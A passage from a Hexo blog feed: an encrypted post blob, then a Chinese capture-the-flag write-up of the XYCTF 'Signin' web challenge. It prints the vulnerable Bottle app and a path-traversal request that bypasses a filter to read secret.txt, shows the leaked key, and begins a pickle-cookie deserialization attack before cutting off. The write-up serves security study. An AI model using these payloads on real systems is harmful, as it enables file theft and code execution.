7f295e91a9ead3209b42349422c55bc45f1051c096f8effa4f1d9559b7ada4da73749c5f8983349195e92ef0b97ab7466a427c6f628ae7f06a0f6584be579e6cbd54e9f59330f1a70aeb0b09ce1e44a5cb722098ae4ab27cbcfd698c68345f102401f588e0c6a16a3564d15446994f05713c0293a6bf9211b4f185b30d69ffc57e131b664470fa4fa7ee880fe13d92dc4743a135bf5832679b16bb6b0b4e8e0910160375cb3705cd0141daa2e373e258d13506592beb4bd1275a83378ddd975a04fd7a3d2b75b1aadee7ad6f436696067d11acf8dfa35473239f29b44e2095475b466df7ab78774b1fd5612477dc68f48ffcd527993bd2002bf38576744ea9c5753cbcfd8ec6faeafde45c15927744d30bc82f8623bfa39392fdbb97be70261497c50693059cfbdef958dffa63b857a79ec98b652568e0940ede6f050874dadd39116b68ce50f92f3a114f096378833d3905d4d36a7aa7b3ca07a361ef7162742ad83445c2bced08bf812c5b1c34f350141ac350ecc7f016717deb8cbd96d1dccb90637118f33e04d0d5d822bacecc5d0c1ece1e6c67e79b8bcb9718bfd3a74c1fd98d8ef7f246d4b7e2c7571d6e7c564d937b2f1bef7360ecc4d5c8ce8265c387378233c28cbadb68b6af57a06362da0d737f233952312f28b39dbbc545b3469d7e16eba61faab136b205a581a486a1698a52deb860979aea6dc3f04e15832cf7d0a8fb4c88dbc73578f565c77eae5c04e198309d453e3d644d2eeec8eb88d9b88c189d088e446023be1ea9863c53b229a7fd6be8ba636814c34ac2cbec66f0726b926aea897bc080c2dbca4b289c8a7b262901b12148954e0bf868ac2955f6fe19ac2bf029e477e1a377229edc969ea19f6d3ec19495e3e9cab568710a72126e5b094fdd5419b0c8c9f0ef4954319619592ef8c96f6249e315e39972c3307d0762d4f0cdb67c8b67eaa57f3402c8ef118f229107cf09d14598fc2059efde8709cca928a433a81aeba0bad7783eb5c4d5da502f80c473b92ac218edba91d04df0e81f2653778c8a3d90a5911ca67f337606b70341fbf63839f82054dd8bb895169e8b7f4a3f3c77342ff47602bb56a6288affa31ea943b7b1ae98f48d67672b9e2beac59dec77d762d99fbb0b114a86a370ab042a0a71055fd83c7ec1c01ac5087641c70ccecc0b0de60a844be685093be840a29c9f73d6a348f9b376ccef8956217ac5cc97ecee8628a8feea6d7952cf321a104b040bfb1b1ee6c6c325623eb6de75492f4fc6c6e946926da47779997341addc91d5eda4b1e3b7c80a771c4eacc8d9c17cf317df714c1d58b7803d5b0b2717c86d2f7a70a1dd2f066067975ef603d071bb2d96ac476d2101472991c8ed7c75b7b90d8fe2130199bf392bfc86819f721cec1048a97c86e47207f44fcbc0fddd7ce8b87833bf1c9bce32d41fd497e83c92b7d6d133e55785611b53bab8135ae35225d2bfa7a15ad78c6a836fd0469d146173d479bfd25d730bb5bf29ee7eda41716e9289eeabf82a2de6c954aefcd0bd51bf4c5162e23c4093116bf153faf200ff45a2f428e729751f22d5b0b84ebbbe9c38d0e4db3d784367711155ae7370478246474ada988a8e9497ac79548fd8b9b9af80f7c4b1c0cba6c013027182a26ef4929c0ddd0c863f1df560d885bca385f5818cc098922dbff318133fc4353116f8093f07c516f84b0fb23fb0d7731dba3a803ca19022108e806e9c80b3d054d75408fe187943a54628d23fb75986fefc22df0c9dfa915694e1ec6be334d013dc62350592b97c962578988a32c3a91933054f2afec3ef6b3ad53c7118869ff70b80f4f4b7e379333d84836a686d8a25ffb44ff69324cfcd4750214cd3f6e09f977e2454bc724c9c58dacdd885030bac36d986f4564d35d05b96ba03edbe136bd99310f1f8ed53a2f7ce774ba57079588a15153d6b5bea1b52ac0a891105493c2650145c1e6ace8b50cb0868b533c0a0aa92d563438fd0796ac10270dd54915496939b51c94dcdd72126ee25224a81ad8a6dfef1f14eb7a76d294952f69b3d447e2f111178be79f2850815e8a2f09867e048be2dd77319b79406716a55215ab4d5f24b344ccabca47772be228321af5359f4681f29009f63a0f819226b2886d56eda7079ad7ebb5f337f120a581ac89e1eb0263910dd38f3de3704752599645037c7d84e5d11813f463a3dbb786db57a123bd5f187be4994d31118ce552a07be2c52ce1ecca65a6019175c25dfcd5063bb4471dc383c1f7fd51290c96cb963106bf82155a6064af70620baff3ea9dc8683ac5b3913c1925f06eab9173e5d3bb029f8118641cd50838c73121415154bc7f45cb2a78405150425c3f3299f9a8877a23a1bf7df109c347740fb850decbbc7661bc350498d0ce4b6123ff9aae3b18a61cb448b206778768a98fa7ce3d700ce522cec247802925e5ea03392cc9de947c45bb3e2c1008e2ead3dc8cd4f1d8bb096325a0d8fb80a9e21e8e03d4a113ae03f96466c5aeaf42560d84fffaf125a11cd828316a186ec05bd3a09aad896752cce8443b9b889c3df46ad88baabdb740373542b32eb40f0ae48140dfefc8f963256d0775bee2566cd5819bc401eb095142966100b4847a194880cb92cc46f8f54a0aca03e247388fb1d664f5b67ccce693fd4c63c1f67e0803931c4dbda5656210a3c14fbf6c7cbd27854585f9e01a4468a254a04ae98340d0a6fd796b34eff2ecd6b469ef1e1edb927fc1a19a18d6a517bec5df3e401c3d970df10f236898a0c610a3e52903e36f93856babd0eb3b66823e5b1a851865d211d43795374bd92c387bd6f0764bee6108b6f2c63d9561203e779cb95f12f1ede4f12b1c718d1d6685586c64002d077c809f9e7d3e617166635eed521b86b333b3c12bbfa84e4bc2dda96c7a1c67b1d4751ae67389cad2f529d67a605ea4c72ee9e0e492c61f1764e86183a4028f06463ea927b67ff1500f87b0de0f70de542d35a2e3d2accc760142804de9a916877c01bae6da2863f5169e82cc8585b43074e0f6c334fa310b7c81a07adb19da0271f7bc30911c8946913244a23f2dcf2178c859bc8b7fc6f4edbd0922e52e4504a9e6e51dd1963fd2505d715ce8ad9b36955280da1e5ad01a939dd8bae48d62e1a9cf5961896fac37b05fbdae041f54cd101de8794b59aa6b875ded72644264143f152100d79c810e572631e2d56ad8fa842da82fea94c2c131f9544d2088b97cac7b1aef63f458f249af2e0bc2244847b15286ce2adb003ed69ce62682796a08e1819c97e6e56f606f11af8762780498c5d651d5d6c0d3ba2a6e224f9f85f70a1b9fa9d6bf3c9070c96bfd9049b56b8f8d4793702512d98aa4b6b3debb49b60ad814e6da6ec4a8acc321c3ebafe6d4b6c53e2dbc68d1b29ef79f3345427943fe6e1abe82c5655892e65bead55bb4c6895c1f8b4823a0e11fb6e9be68b186eaf6bf7e07dd638c92caa077b142744a361be746b1304ed978491b532d86fc9eea05dd21aab2610ca40189ce7eb2c9ef8cb08fb6d5dff5d2a941b7265d7b2feaafc3ebe03249cd7edeaee50281cc991df2bd6ef5b1ba719a3c3124cab6a605c869aa0d6c56f567ac485b19598081823d456c647e8b2fe171dfe4d178759e478322f3283190e0e6cd3c133403a7c7146b4659f2f0e4f3495cb758ef55c10e103b67526b7946cc6436fc4b86f2d20ac66afd6b2775ef8f63505d345cf915c2ae78c621b927cf95fc908620b8cbb200027b6d96244cc5e3fcd74d5f84139035909569ffb00a60996bcd05f3812ca701a20961fbfbaf4a7d8cff9cf2db74611dcfd7d80c902246fce2eda07d32d938487c9c968d2434f32834d6537c00421a858547c274300e41ae25c218930913c4efabac8142d066eb10629906aca1bdac7f7b16d2e005e880d5390e7a44348b204d08af453316f6cdb2345b20312c411fa34f0cedb293d43ef8d012d33d86210be6bb3827cd70437434f1c7821b88bb12a5f18b4896ceea5adee1b33787f4e8c9205c967302e8b6a3343db35223f1f7f9abd35c51f7ea90a1f305d001aab1d9fd48aea46cc412b72319e018fc5b862c62624755eb9c7e5f157da41cead3faf6db2454d7df5f4206ce522437c06a74b81d1f4eb1ea602f5e631c8103a0291cdb47775c473a2d3c7130f384bf0a88318f4452de9e282a8c188047f7a2762d6adf3728183065a21fd15ce596b5fe3ac3022845b4d0deaf916c426e7d5093e3b75bdcab352fc902a7e9762fe8f4bfea3cba1c10a244b32ecacd2abc8bcbe14f4581be320dfb7f8733724e649e7c98f3be584b7780225462b5add127c8042da2458a9e9830a46df9b62f3a4c56db6fc9ffa29f86f7ccc548d0487eda2b532052853dc8fbba3ccecc6bcb959c59a77ec2a982c926db876f1a2747a5b0ada281faa3dc2eea3afc6d95bcde3a6765e4768190f4469324267eeb8a1474db5bbe011ce9ae89d991adcbb5c3cdc95f3b3d942d22efb06006909c10ac22c3fa7fd10ee39c3ed3c9c1639535e8305bf1a4da2418a4949ab9bef81d63d53990ec6ad6ce9c675ff996929215388e253265c4bd7d00dc392a97a8e2017d16842c67d7d5b0efb59e377a67d180be42e4d983070fd0dbbec6274e61ddf2a2b3c4fd3fec337cba031b7549ce4ccf0ab4a0aa9f1883f8a5ba3b7cb7f313cbccf8eccc09f6e82228031c1be7b3d67d62e69ab4933e6f2684bb53f0193b286a85170ee79ed20309bb36a8efa3d4c5d47edda50e2894e0ddf9e09435f9836903ec9deee8366a55d24ae6a7740b887d4ec7f7b85f62f3b44b0a2e0d7ae1e6f84ee3a0b33ac4de11b82626d8e38e2e24034e52b94b963b62aec8036767bc5d94240a702ea2288be6e4cac56065792526e0f5b01c294d8c15f337f24a0930189a4e4267a6c4bddc13e9a5187b2ba8a9dca9ce4f8f65af6e735c615ad5d812ddf16bf838ca9b41400ad4f19d81d8224db3c10da35e634d0ab67546a66e68b3c995a7fae8b860c408b01f65a9a481f2dcdbb5eb18b2e1d5be70a237dd8340ce238df63d474ff6ab2372f867a3cb603d4fe2110c2dae0450b245b768cf5cad9dcbc615a7149f61ac4c859e4c1afbd717deda314a5551e62f47e8790eaa0f13972b24f3aebfbeba240c4e698ad73059bf0e8537d11062ab3bead199c9f3728cde60261dcbe956ae73f2af93e76c0db6352dcf655fd4e498286b598780c04e290b50022f7ea6e8097a1f637e5f2458d36af2c8ee11ef5feb01e91887b030217ebd014daab49d699d6afa7c8600f2fcfa96d238ad33ac626be6b09d536f6f6e20958c8cdc9f053112e00ba7c7826a3a873f9abda4bab2f11cf1d69f6bd49f027f86603e1a1e6c2faf212ad5698eaa7f1983b09792aa2a4a595d5a03f890266e45ad2e8d6295868772f070f693cd5751dcb857a69dd0990b7e7f8eff2a17efff8f483a6f59a296cd2c5d82c49c48216f7df0d6b7bbcdbcfd6c3071f15edc34679ca7b5a02a1dc793af3b1893ef3fb4088ad2c77ce679318ef525ed86a39026b0f431844a7861606687ad5fdecf4420f642799fece402b68cc431677a4ae0c57d96fca57a71883b5c2d11da6b29442ad757153bd0faf21c01368f9528d7b77b71de5211642538ff378daf2f1bdb2595fd4068c09db0f0bc83feafde4d4036bcea550411e547853cd8a27b46ffe5e90255f9ae47a19502ee835756584ce1ee5c78144efa15403c751ebe1770f5cf9e5272cc7c6e39d9ff3959df05e75d80c73f862f8c4c8c0006c2f6255942492529d295ff293114f485c359fc0cdb770d512d2addca707db01e64ca37617b4eb244deef087447597dfa7cb13ce5912ef345aec98410d3be69c87839886f48e4a8eed8735111fd6c873264f0a67ae86e81b2bf3c34fa63e2d837d8440cba3ba7739cec7f66289e667423bd4d4822978fb41ad635f40492a0c2c9c1928f33705c90bf080efe7b8f5cb8477fba6384f78342684a0d86281799ebfef1240fa3e94253ce2c9bdf77d9e405b706c798306f519761eab3d6569b6d196bb2c4019bcc7aaa7b72b94426a05e2dce1fb3021ce3788e8eb85045a8202f7db66e1770e3419cd0abb83fa4d35d8dff6908ae7ee3a03b64e4acbc49c783e69ac01c42091c43a6e55ca059b7940ad7d49d34f2896d94a9b4bb5258284c99c55a796b019a42dd98aa5873037ea0c6ac891fe9b539040ad5749c4d932d241db6525f69e5a4f82142b9e45ea450bf0bf485a927ec3e932ff675d94a015ffc19dd4520e7673730f8c994bd1506e36514f38cd6c27c69bdb74149b7293ae6d3cfc2c6fa2f0cc4bcbc53d35a847ba109e2b2760b6ac78f08c8beae6ce747082456af0acdbb27fdbd6aff9e18040c6da9741df107cd8e0da7beb690cf379429ce71e56b4a4b6c9a31edaacaaf8116233d21a79dddfa9e760663fd86b904effa94061ebe5981071ac12da8bb567807c054d188955f6ffb9e3b619a2ef58988482ae374bc71fc93d8adf05453ba40011c3c64808cc2ad98c9fb23ef7b2099da1a6c24e2a1bf173fc0d688537c4145df001a25ff4f895f45375f3f168793d008494aaf60e0c4ca5555a3ce49b6ff7d09d26b761c7d3ff80a5b24f4bda1066f7c12f3588a173062903dc92f6742db0f4807ac0bf620e417465e2e683a5ebab9347f1146b0f6c4f4cdd3dc089017d2559fa75bfb285110c45b4381abbad077509c2a7778f9824856535f0fd1988c6924027d3f36833b625fecf04d4bc7e0b53de34bb2cc756ffbbee06bef40f51774b23026a41bf81b6add60a7fb1732bac3af3d22d15ab05a4faaff3cbc03219e2e41a0ce628014aa915559e58839c82e313906abdc7971aaebcc932f52cce82744f37a9372d0ed6768f620a49be3b08968a0b33596b9b76883e8686a384ffd6d99338d5878a338b8d52dd38e0f7d9b125e414589f6fb4b2463776d1ef472f110c8a97738136370465b3a4fc2d2e960192a82ff1f7007c38871dd393f1bb079ef8a12dea2b136447a125e6ffcd4b37cac7d65de97e21bdd050a1c77dbd3aeaca494e8ed8a0afee128e59f36b97769a9729cc299d0fc8dcbbac60785b34539bebcd99c1fef22212df840570fb4a55468a36a1d3ffdad8a7fe15b2f9956f677811cf4710c3a7a990b97942598465fe699b174128b70f2b6eb3f3af4115244ff449daaa498c6c71a50dc1ef29b9e30e712f4f4c41f5f3decbbbc654496a4182528b14f92bc0304b2971495dfb525b8fab5698eae0ec415dd43de0335f1ca944faf7909f7713e613a5c4a78515f71d77998f81ee95dab05d52e0cbe5cea56d13dfce2d7ef7a4aaa96618df9b8dc76a2ddb91a08ba6714b021909ea55677a4b47541a3acd127812f286bd356217a84a19072317e8beaf329e8086cf58ed0ee644bed739f2b6cb8d73eab0c5e0c698052a1442c25113fb97f1445557da73c5b8def91aacb796a6da61c75e85d6b22c1ff23e9c67d03dfbb122eaf3304a029042280e74f0289e5c0c0132cbf205fcd62ea9cd20f6b765f027372de9202757e90cca20a51d0a1644bd19349932acc9a795d25a0cecd07e1973a6382dafac4d02d4214bd65b7cec1e09aeecdd19c31202c3c18f1ce8ffd8a032a02584eeae1a12eb6bde9d43ab63bfb6922fe7fb7269f62ae5f857e079ea945d07de2a602e66924b387a969b796655d399af8de7bfe531e918374722fcc5966b81ed2ebcf24815750aade076371968cc19bc857079cc363334d84d60aa0c1d35013f3fd92a59c0a49a0ca1a409a1a11be9393f6fcdbf2f7137e6cdb4d68d4c372951538e98fe943436912a674fe99bff562eebc29c20693b4ad8a5c7c4dceec31db8a688df948c5757bac0c0b211f9ce3874ceb0159df492277bd37dfce8797d7e0d3a0fbc3b367b733996d0cadba99e95a481201d2bcea63da0b35ef6b7f12d1ed55e22f5f42bd1796654f7ed0261e68432bc04028600f29daed8f5b98d230d9fc0e0431753caff9c190e192be98478a5efc4ccecf771565c023d17f918128959acc3b087f3dfaaa4aebc9d38c490870ae77daf8360289de8c9dfbc6747363a9f88edd706410197b626146e6a422c7263f232e1ca109e5818eb4ee1faa83dafc8750b14069dbdb7569788aaa60e88c767a12e2669c39e147e445584417f388878ba72f527776feff0cd664d0ffbcb111f3f9bb35be2aa13b8672d60efce494078175f3bef9a99c4940740df751e8e7baf9da0f23304f5f6d28452018b2ad4ff6672ac57e2a4c6b3d759bab193a9f204098b6050701452d10e5064c82870eb99e6fe3f9d004b318a2451774c78a623e114d89adf10f6a635d56d0d8a33d99bbaa52b94a9ccc61451960794f899921ce5d3a3f2abf72ca089e6530a9c0e5a44e5779a66e38184ada32f31fbd68ac8c98d230566efe4c4fb66e50cb027493d07e2e904311c5f27d879053c3a1cdc48cdf09f6d374ff0bb47e192633d71ef3f988518d1b2fd7e02da6fd94eae819c7a3c14296c95e763f2edc8fccf77bcc1de8c6af0b96e476fc6b2400c5cd133ec191404b5946633a6c470a35b2ef8ca9a619876932212c7b769b732410638bb9b83af6421cbed53c2b675cbb0ab547971036b9661c349c9c27af3c6b19899468356481d199a5cc8c6481324b594e4df74b46069f3771970ace45c1c6bd62eb17104fa565909a224197fe1bec21a65801d10f2911b7b311ca77495a8dc94d4ac3b2c779380f74d5a67c6343754957e380729c1dc62d460a7dc8cf279595c275c58531a4e773aafa783401986e5e202931c8d85a1174a3fa13fbbf14547a672e3368c54d9a87697d0c041a34a39f743030786ef3eabb3aa207d464f3f6aa816016aadb40465d9d8ed8d9a58dc42506973c9a7e61ccf0ca919f6d9a07e06b1145147740fb53808e46d153dfaa4af1a5c841f444b6ceefcf254a2a08a53132f6dab1f46b8949bf644b3aa8b6bb341830b24014b83376ac193b94fdb96923bb6f88edf7b1c93b7e6b28b97b8137339c595d44fcd7222893e519e725cada51528581ddf0d8e8a1ccc14cb5c76c4e1aa8de50293ade181f2f173b898e5b498e0dd76634463de4741c704f5293277b77f6006cfcffd7948a79ff40c520d8251a4041750cd51203d80bc292c7fe24784272d5d699915327ac24280ae46cf690356fa8be323836c9ad9874270ec3fd5d143d9bd5c7edfd3671247267941b2669831abf1847babe80c40801e1bf9345a30233e2a62482866cbd40a34bb1e8fc1eaa8bfce0265e69221d4545b100ca8e1855dc3f2aa631a17ac4d54029fc3cddd493be9aa83067695fde7b180f8cb95313bc96fe25d294bec7cf89980c44f383cfe99269a66a4685081ef9c34071e5df3c4dbc58a3d106f017cc3b981d2172bd2e9e35f532bbe80a7389815a6ed449edb8efbf48859e96032798c1ba26aa91a9f5bf105960b5098701dffdc1fef5102c9e5b1bb5ff7fd62e6a83a62c55b6722325c548d6e6cd2fb33f6b4cdbea75ad2c20a572710c953abc0db3c0b5d4671350e864a780d4e8c12ebf4c3cd68be9718a713fd01497ff7499b105413ee68620a2ba7d9fa2574c8bd11529a331273c93b12a5853331065db1feb9aa0f01802fbfdf981d539d572d7870a35c7ca593b39b533fe623439e2fdefe7599a7c7db8e6c03f879dd8718992383a05a8718e4280f3d0bd0c93a1355a0cb11cce4bac73da61eff06314242e36e48078dc21f604194490ff92872432e13507f6e73ebbc1d08b6530d027c94a77646a1ba06bde1667eaa4da68e30f831c8a4bd6418f16c4ae94be3aa674886fb88b508889c01b9014d239b935c2c881d183ef9f28b57f42f271c858b657769851d6cce98a4e0eaac0342cb251893fd8c573990cd112b4584e9c4c06103beb01996a14a11d37a0f0406557ad0e90afa001aaf4c411f25445f4ca7fa7b976112b4e9c556d0976c583b02958730648c85f420ad4b5d3ec5307777881129e382dda45254d22bbe8d94ab26a8f4125928947a36d6982f238ff72d621e1db85f65f89d9c8a1fdf702d5dee4bedcc2e58d4ccf757fdebcc5a753f3d0ee8bee8364ec68a9aeb2c1dd9c4b64a4319414c9fe972698598786b6a122e19b23ad411980dc1e274b4aa05d6a25c7c313d6509ada6020d97b4273c4554993e2ed9d2febb5eabebf5060e2b33880b1acb82ca871ddf33b94c37c14198d13bf85ef94739efe1b440a146598ace5ed7772e68403cf71345b83cd40b2216c5f385b2bd02a44f680a8e7bba58b68bcd56442783477bf07cb66cbed618319a42747a99485ae30dbb0b427493353fefa6df50e9b5e34e1d26e1bec5ea8aa85d46cdb6e34e905763d2f098f36bb5d09658250db2efb4f54e9a2c76e48ba5b85736e0751fd2a867aa065d6829641733e70aaa5c9823abed9b1fe6d32a1926a9e3c0bc5e0af2babf6b51eb42203fb9dee36f93b2bff0b648b22598164b67ff32a0951f6131dd7d64199eea67b6b432fc900d999d65dbc16587c07727abdb902a843c7ecb5326a978aa6e4c0ca6fa0f238df68fc22b16e5afb1d318b07cb3a70b56faf3004265c1a8deb2ae370087bab0412f4098ded63822e7ddf0cfc21de266318b54046363046e4b492f1edb95ce5e83910382591b6ef9dacd26472f4aa68ab47f5aef0586404c97bffa178d268fa11d460f6d0786d42977597b5f2957e68931cec29ca630d75cbcfbd52e73b918e277f462282298473afa89b01a9f665c4feb151f5386798a7e0df905216a389f2731f8f40fb7eaca62140266cdc838c2707e4b16c34dabd33844640770b292cec18b8c23b2ae95d76f9f65413dae791a5e1d55e98ee1add6ca28f5a157d2494bd7b168a9493c8893f240dad77e9ebc1e4c383a7d24a8ad436248be97e7e1ba2576028534dc6889aedd4972d37c8379b9f206ee00010d355145aaf7268d264aec466b067474e3ab447247a17ab521e1fc8d32a05ff7a4530f9d3b233b14ca4f986a8b9b3d9ff056a79ce0490d517de975f8f94313c03850b9e66e48461e32a9019c58caf51f2571887ff367af56c3342ae3d400f3f1dbbe494bcf01e2e3a4bccd9e3d85a999a02b388bbd22656ac5b1068ffd34c111c042bac90e22e26500f0f2bbd1a3f0c464edd3145d4384ab9fcba8ccd9421c0de4ad8ebc8e0ebba89eba313ced46d4464ffdcc027f2e745a41e242470394203a3db104f158e1935f199907d44610a6dcb4481c4a8191d21d3ebc80b2a6a3c2b5aafd3841cea8ea2a1a5b0cc3e20ee12f566082b2a4c9ddd060ba3cb4ab4db583a34bee8884dca3f95be3cc836bbd8ea593a6201851948afb41349e7f062f35970535366bcf1254f305f079e9b8c394afd161d4d64c2f41feb39db7b30bbd89a62a903f4299529b7dc694591c08006e31fe1386f93d8623e0eb17e4040ea90a9952592f8cab763b3bf879082284787ee02a1db61ed0c37e8c6b5aee44fb18d250030a3597a356f549679b7c1d50e617f3bcb3f739f1f207cf19dbc126eb0d78afa51cd2007d569aebb4d47b977a05869b208ac90c8ab7ec40702f1361383269eb291dd9eb6b87f43b1cba056f2f63cd8f3998aec50939c1a417657295f4b334b1ff2738ff5528540c48457917ce88724a8b8529a79377aef184e042d9c6cf3e1b09e5fc710aa9bf965989ebb7365b4195f7d61773813cab127f12c441477dce7cf423ddec9b1f8aa16371106421e9df36699ee38925929699e5309914af680d97c71f3062bdd7275515ec09594414b3a66026e6683f811bed6b9f092facfcfba0cfc0ee89182110e2640d9cd30dcc8e5073741cf966821c1a8d56a2d1be6e2d460dc5a0d1b2cfabf973323e066a31f9d0c3bfddce12245aac91d3f7cc2a3e324af6b85583d562e9e25584cb3731bc4ffc709b92685eb35738cee3da24c859bb6f47a8c15422eb7e9a9763a67eb511fe14691d33e1dffed1713da2932a6c6f4800cfe5df859f3d6cb3baec28bf53187b5f8201f4534ce85bc4bae913cba6777941f7462eed6f8304ff720c350484f1c7332ae2884fa74109df97fbef639056bdc82c4ecdc04cc885853e6e6e3e6733ed6114f4ddeb5c469d08a4019706d20a137e27b992245e8895abcbbefa68f90a69087c0fc77dcfb2de6e5cc2c2e543a437a44a241163edb7a5307d91e330289c62388bf340cb309dc808bb527c4ff757ae219854076bece0041d05efa75fd4bc1b9f2e21d7ad02cb8cf394ee3dda31d561587c8</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">此文章已加密或未写完，请输入密码以查看全文内容。</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>每日一web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XYCTF复现及思考</title>
    <link href="/2025/04/09/XYCTF%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%80%9D%E8%80%83/"/>
    <url>/2025/04/09/XYCTF%E5%A4%8D%E7%8E%B0%E5%8F%8A%E6%80%9D%E8%80%83/</url>
    
    <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="Signin"><a href="#Signin" class="headerlink" title="Signin"></a>Signin</h2><p>Bottle引入了pickle，鉴权的时候用pickle反序列化了session。只要知道了密钥就可以任意反序列化</p><p>源码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">@File    :   main.py</span><br><span class="hljs-string">@Time    :   2025/03/28 22:20:49</span><br><span class="hljs-string">@Author  :   LamentXU </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">flag in /flag_&#123;uuid4&#125;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">from</span> bottle <span class="hljs-keyword">import</span> Bottle, request, response, redirect, static_file, run, route<br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;../../secret.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        secret = f.read()<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;No secret file found, using default secret&quot;</span>)<br>    secret = <span class="hljs-string">&quot;secret&quot;</span><br>app = Bottle()<br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;HI&#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/download&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>():<br>    name = request.query.filename<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../../&#x27;</span> <span class="hljs-keyword">in</span> name <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;/&#x27;</span>) <span class="hljs-keyword">or</span> name.startswith(<span class="hljs-string">&#x27;../&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;\\&#x27;</span> <span class="hljs-keyword">in</span> name:<br>        response.status = <span class="hljs-number">403</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden&#x27;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><span class="hljs-meta">@route(<span class="hljs-params"><span class="hljs-string">&#x27;/secret&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">secret_page</span>():<br>    <span class="hljs-keyword">try</span>:<br>        session = request.get_cookie(<span class="hljs-string">&quot;name&quot;</span>, secret=secret)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session <span class="hljs-keyword">or</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;guest&quot;</span>:<br>            session = &#123;<span class="hljs-string">&quot;name&quot;</span>: <span class="hljs-string">&quot;guest&quot;</span>&#125;<br>            response.set_cookie(<span class="hljs-string">&quot;name&quot;</span>, session, secret=secret)<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Forbidden!&#x27;</span><br>        <span class="hljs-keyword">if</span> session[<span class="hljs-string">&quot;name&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;The secret has been deleted!&#x27;</span><br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Error!&quot;</span><br>run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">5000</span>, debug=<span class="hljs-literal">False</span>)<br></code></pre></td></tr></table></figure><h3 id="路径穿越"><a href="#路径穿越" class="headerlink" title="路径穿越"></a>路径穿越</h3><p>在download路由下存在任意文件下载，使用<code>./</code>绕过过滤</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/download?filename=./</span>..<span class="hljs-regexp">/./</span>..<span class="hljs-regexp">/./</span>../secret.txt<br></code></pre></td></tr></table></figure><p>读取到secret.txt</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-symbol">Hell0_H@</span><span class="hljs-symbol">cker_Y0u_A3r_Sm@</span>r7<br></code></pre></td></tr></table></figure><h3 id="pickle反序列化"><a href="#pickle反序列化" class="headerlink" title="pickle反序列化"></a>pickle反序列化</h3><p>反序列化的示例像去年的<code>SekaiCTF 2022</code>的<code>Bottle Poem</code></p><p>我们来看get_cookie的逻辑：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span 